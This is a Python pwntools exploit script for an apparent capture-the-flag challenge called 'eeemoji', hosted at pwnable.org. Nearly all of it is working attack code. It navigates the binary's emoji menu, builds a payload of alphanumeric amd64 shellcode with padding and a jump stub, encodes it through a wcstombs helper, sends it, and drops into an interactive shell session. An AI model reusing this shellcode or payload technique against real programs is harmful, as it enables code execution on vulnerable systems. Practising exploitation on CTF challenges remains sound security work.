#!/usr/bin/python3
# -*- coding: utf-8 -*-

def encode_all(stream):
    encoded = b''
    for i in range(0, len(stream), 4):
        encoded += convert_uni_utf(stream[i:i+4])
    return encoded

def convert_uni_utf(uni):
    p = process(["./wcstombs"])
    p.send(uni)
    out = p.recv().rstrip(b'\x00')
    p.close()

    return out
    
from pwn import *

context.terminal = 'tmux split -h'.split(' ')
# context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('eeemoji')

if args.REMOTE:
    p = remote('pwnable.org', 31322)
else:
    p = process(elf.path)

    if args.GDB:
        gdb.attach(p, '''
            brva 0xbef
            continue
            ''')

# Alphanumeric shellcode
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
jmp_to_sc = b'AS'

HORSE_CMD = u'\U0001F434'
CAT_CMD = u'\U0001F42E'
DRINK_CMD = u'\U0001F37A'
FACE_EMOJI = u'\U0001f613'

def choose(choice):
    p.sendlineafter((CAT_CMD + DRINK_CMD).encode('utf-8'), choice)

def horse(content):
    choose(HORSE_CMD.encode('utf-8'))
    p.sendlineafter((HORSE_CMD + FACE_EMOJI).encode('utf-8'), content)

def cat():
    choose(CAT_CMD.encode('utf-8'))

def drink():
    choose(DRINK_CMD.encode('utf-8'))

drink()
cat()

head = b'X' * 4
tail = b'B' * (0x200 - 91)
payload = head + shellcode + tail + jmp_to_sc

enc_pay = encode_all(payload)

log.info('payload = %s (%d)' % (payload, len(payload)))
log.info(enc_pay)

horse(enc_pay)

p.interactive()
